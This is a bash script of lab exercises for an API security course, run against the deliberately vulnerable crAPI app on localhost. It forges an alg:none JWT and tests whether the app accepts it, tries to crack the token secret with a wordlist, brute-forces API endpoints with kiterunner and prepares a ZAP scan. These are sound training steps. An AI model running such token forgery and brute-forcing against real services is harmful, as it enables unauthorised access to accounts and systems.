#!/usr/bin/env bash
# =============================================================================
# Module 3.5 — API Security: Tool Exercises
# Run from your Mac with crAPI already running on localhost:8888
#
# Usage:
#   chmod +x run-exercises.sh
#   ./run-exercises.sh
#
# Or run individual sections manually (see comments below each section).
# =============================================================================

set -euo pipefail
CRAPI="http://localhost:8888"

echo ""
echo "==========================================="
echo " Module 3.5 — API Security Tool Exercises"
echo "==========================================="
echo ""

# ---------------------------------------------------------------------------
# PRE-FLIGHT: verify crAPI is running
# ---------------------------------------------------------------------------
echo "[*] Checking crAPI is up..."
if ! curl -sf "$CRAPI/identity/api/auth/login" -o /dev/null 2>&1; then
  echo "[!] crAPI is NOT reachable at $CRAPI"
  echo "    Start it first:  docker compose up -d"
  exit 1
fi
echo "[+] crAPI is up at $CRAPI"
echo ""

# ---------------------------------------------------------------------------
# STEP 1 — Register a test user and grab a JWT
# ---------------------------------------------------------------------------
echo "=== STEP 1: Register test user & get JWT ==="
REGISTER=$(curl -sf -X POST "$CRAPI/identity/api/auth/signup" \
  -H "Content-Type: application/json" \
  -d '{"name":"JwtTest","email":"jwttest@lab.local","number":"1234567890","password":"Password1!"}' || true)
echo "[*] Register response: $REGISTER"

echo ""
echo "[*] Logging in..."
LOGIN=$(curl -sf -X POST "$CRAPI/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"jwttest@lab.local","password":"Password1!"}')
echo "[*] Login response: $LOGIN"

TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null || true)
if [ -z "$TOKEN" ]; then
  echo "[!] Could not extract token — check login response above and set TOKEN manually:"
  echo "    export TOKEN=<paste_token_here>"
  echo "    Then re-run from STEP 2 onwards."
  exit 1
else
  echo "[+] TOKEN extracted: ${TOKEN:0:50}..."
  export TOKEN
fi
echo ""

# ---------------------------------------------------------------------------
# STEP 2 — jwt_tool: decode, crack, and alg:none attack
#
# IMPORTANT: jwt_tool is NOT on PyPI — must clone from GitHub source.
# Install:
#   git clone https://github.com/ticarpi/jwt_tool.git /tmp/jwt_tool
#   pip3 install -r /tmp/jwt_tool/requirements.txt --break-system-packages
#   ln -sf /tmp/jwt_tool/jwt_tool.py /usr/local/bin/jwt_tool
#   chmod +x /tmp/jwt_tool/jwt_tool.py
# ---------------------------------------------------------------------------
echo "=== STEP 2: jwt_tool exercises ==="

if ! command -v jwt_tool &>/dev/null; then
  echo "[!] jwt_tool not found. Installing from GitHub source..."
  git clone https://github.com/ticarpi/jwt_tool.git /tmp/jwt_tool 2>/dev/null || \
    echo "[*] /tmp/jwt_tool already exists, skipping clone"
  pip3 install -r /tmp/jwt_tool/requirements.txt --break-system-packages 2>/dev/null || \
    pip3 install -r /tmp/jwt_tool/requirements.txt
  chmod +x /tmp/jwt_tool/jwt_tool.py
  ln -sf /tmp/jwt_tool/jwt_tool.py /usr/local/bin/jwt_tool
  echo "[+] jwt_tool installed"
fi

echo ""
echo "--- 2a: Decode token header + payload (RS256 — no secret needed) ---"
jwt_tool "$TOKEN" 2>/dev/null || echo "[!] Run manually: jwt_tool \$TOKEN"

echo ""
echo "--- 2b: Crack secret (crAPI community service uses HS256 with secret 'crapi') ---"
echo "crapi" > /tmp/jwt_wordlist.txt
jwt_tool "$TOKEN" -C -d /tmp/jwt_wordlist.txt 2>/dev/null || \
  echo "[*] Expected: crack fails — crAPI identity service uses RS256 (asymmetric), not HS256"

echo ""
echo "--- 2c: alg:none attack — forge an unsigned token ---"
echo "[*] Generating unsigned token with alg:none..."
jwt_tool "$TOKEN" -X a 2>/dev/null || \
  echo "[!] Run manually: jwt_tool \$TOKEN -X a"

echo ""
echo "--- 2d: TEST alg:none token against crAPI (CRITICAL finding) ---"
echo "[*] Extracting unsigned token from jwt_tool output..."
NONE_TOKEN=$(jwt_tool "$TOKEN" -X a 2>/dev/null | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' | head -1 || true)
if [ -n "$NONE_TOKEN" ]; then
  echo "[*] Sending alg:none token to /identity/api/v2/user/dashboard..."
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    "$CRAPI/identity/api/v2/user/dashboard" \
    -H "Authorization: Bearer $NONE_TOKEN")
  echo "[*] HTTP status: $RESPONSE"
  if [ "$RESPONSE" = "200" ]; then
    echo "[!!!] CRITICAL: crAPI accepted unsigned token — alg:none attack CONFIRMED"
  else
    echo "[*] Status $RESPONSE — token rejected (expected 401)"
  fi
else
  echo "[!] Could not extract alg:none token automatically."
  echo "    Run: jwt_tool \$TOKEN -X a"
  echo "    Copy the output token and run:"
  echo "    curl -s -o /dev/null -w '%{http_code}' $CRAPI/identity/api/v2/user/dashboard -H 'Authorization: Bearer <alg_none_token>'"
fi
echo ""

# ---------------------------------------------------------------------------
# STEP 3 — kiterunner: API endpoint discovery
#
# IMPORTANT: kiterunner is NOT on Homebrew — must build from Go source.
# Install:
#   brew install go
#   git clone https://github.com/assetnote/kiterunner.git /tmp/kiterunner
#   cd /tmp/kiterunner && go build -o ~/bin/kr ./cmd/kiterunner/
#   export PATH="$HOME/bin:$PATH"
#
# Wordlists (text format — use with 'brute' subcommand):
#   curl -L https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-seen-in-wild.txt \
#     -o ~/.kiterunner/api-seen-in-wild.txt
# ---------------------------------------------------------------------------
echo "=== STEP 3: kiterunner endpoint discovery ==="

if ! command -v kr &>/dev/null; then
  echo "[!] kiterunner (kr) not found."
  echo "    Build from source:"
  echo "      brew install go"
  echo "      git clone https://github.com/assetnote/kiterunner.git /tmp/kiterunner"
  echo "      cd /tmp/kiterunner && go build -o ~/bin/kr ./cmd/kiterunner/"
  echo "      export PATH=\"\$HOME/bin:\$PATH\""
  echo ""
  echo "    Then re-run this section, or run manually:"
  echo "    kr brute $CRAPI -w ~/.kiterunner/api-seen-in-wild.txt --fail-status-codes 400,401,403,404,429,500 -o text"
  echo ""
else
  # Use text wordlist with 'brute' subcommand (NOT 'scan' — scan is for .kite binary files only)
  WORDLIST="$HOME/.kiterunner/api-seen-in-wild.txt"
  if [ ! -f "$WORDLIST" ]; then
    echo "[*] Downloading api-seen-in-wild.txt wordlist from SecLists..."
    mkdir -p "$HOME/.kiterunner"
    curl -fsSL \
      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-seen-in-wild.txt" \
      -o "$WORDLIST" && echo "[+] Downloaded $WORDLIST" || \
      echo "[!] Download failed — place a wordlist at $WORDLIST manually"
  fi

  if [ -f "$WORDLIST" ]; then
    echo "[*] Scanning crAPI root..."
    # NOTE: use 'brute' (not 'scan') for text wordlists
    kr brute "$CRAPI" -w "$WORDLIST" \
      --fail-status-codes 400,401,403,404,429,500 \
      -o text 2>&1 | tee /tmp/kiterunner-root.txt
    echo ""
    echo "[*] Scanning crAPI identity service..."
    kr brute "$CRAPI/identity" -w "$WORDLIST" \
      --fail-status-codes 400,401,403,404,429,500 \
      -o text 2>&1 | tee /tmp/kiterunner-identity.txt
    echo ""
    echo "[*] Scanning crAPI community service..."
    kr brute "$CRAPI/community" -w "$WORDLIST" \
      --fail-status-codes 400,401,403,404,429,500 \
      -o text 2>&1 | tee /tmp/kiterunner-community.txt
    echo ""
    echo "[*] Result summary:"
    echo "    Root:      $(wc -l < /tmp/kiterunner-root.txt) lines"
    echo "    Identity:  $(wc -l < /tmp/kiterunner-identity.txt) lines"
    echo "    Community: $(wc -l < /tmp/kiterunner-community.txt) lines"
    echo ""
    echo "[*] NOTE: 0 hits does NOT mean no vulnerabilities. crAPI uses non-standard"
    echo "    path structures (/identity/api/auth/login etc) that generic wordlists"
    echo "    don't cover. Known vulnerabilities (alg:none, BOLA) exist regardless."
  fi
fi
echo ""

# ---------------------------------------------------------------------------
# STEP 4 — ZAP API scan with crAPI OpenAPI spec
#
# NOTE: crAPI does NOT expose its OpenAPI spec via HTTP (all common endpoints
# return 404/401). The spec is bundled inside the container image only.
# This step documents the approach and the blocked status.
#
# To extract the spec manually (if the container path changes):
#   docker ps | grep crapi   # find the web container name
#   docker cp <container>:/app/resources/ /tmp/crapi-resources/
# ---------------------------------------------------------------------------
echo "=== STEP 4: ZAP OpenAPI spec scan (BLOCKED — spec not HTTP-accessible) ==="
echo ""
echo "[*] Attempting to extract OpenAPI spec from crAPI container..."
CONTAINER=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -i "crapi.*web\|web.*crapi\|crapi-web" | head -1 || true)
if [ -n "$CONTAINER" ]; then
  docker cp "$CONTAINER:/app/resources/crapi-openapi-spec.json" /tmp/crapi-openapi-spec.json 2>/dev/null && \
    echo "[+] Spec extracted to /tmp/crapi-openapi-spec.json" || \
    echo "[!] Spec not found at /app/resources/crapi-openapi-spec.json in container $CONTAINER"
else
  echo "[!] Could not identify crAPI web container. Run: docker ps | grep crapi"
fi

echo ""
echo "[*] ZAP Docker API scan command (run only if spec was extracted above):"
echo ""
echo "    docker run --rm --network host \\"
echo "      -v /tmp:/zap/wrk:rw \\"
echo "      ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py \\"
echo "      -t /zap/wrk/crapi-openapi-spec.json \\"
echo "      -f openapi \\"
echo "      -T 120 \\"
echo "      -r /zap/wrk/zap-api-report.html"
echo ""
echo "    open /tmp/zap-api-report.html"
echo ""
echo "[!] KNOWN ISSUE: crAPI's OpenAPI spec is not accessible via HTTP."
echo "    All standard spec endpoints (swagger.json, openapi.json, api-docs)"
echo "    return 404 or 401. ZAP scan requires the spec file from the container."
echo ""

# ---------------------------------------------------------------------------
# STEP 5 — vAPI (EXCLUDED — upstream PHP/MySQL migration bug)
#
# vAPI source: https://github.com/roottusk/vapi
#
# KNOWN BUG: vAPI's database seeder uses PHP 7.4 array numeric indices as
# column names, which MySQL 8 rejects. Both 'migrate' and 'migrate:fresh --seed'
# fail with: Unknown column '1' in 'field list'
# This is an upstream bug — not fixable without patching the source.
# Status: EXCLUDED from lab testing.
# ---------------------------------------------------------------------------
echo "=== STEP 5: vAPI (EXCLUDED — upstream PHP 7.4 / MySQL 8 migration bug) ==="
echo ""
echo "[!] vAPI is excluded from this lab due to an upstream compatibility bug:"
echo "    - PHP 7.4 array indices used as column names"
echo "    - MySQL 8 rejects numeric column names"
echo "    - Error: Unknown column '1' in 'field list' (flags seeder)"
echo "    - Both 'migrate' and 'migrate:fresh --seed' fail"
echo "    - Unfixable without patching vendor source"
echo ""
echo "    Workaround if needed:"
echo "      git clone https://github.com/roottusk/vapi.git /tmp/vapi"
echo "      # Patch /tmp/vapi/database/seeders/FlagSeeder.php"
echo "      # Replace numeric array keys with named keys before running migrate"
echo ""

echo "==========================================="
echo " Done. Review outputs above and in /tmp/"
echo "==========================================="
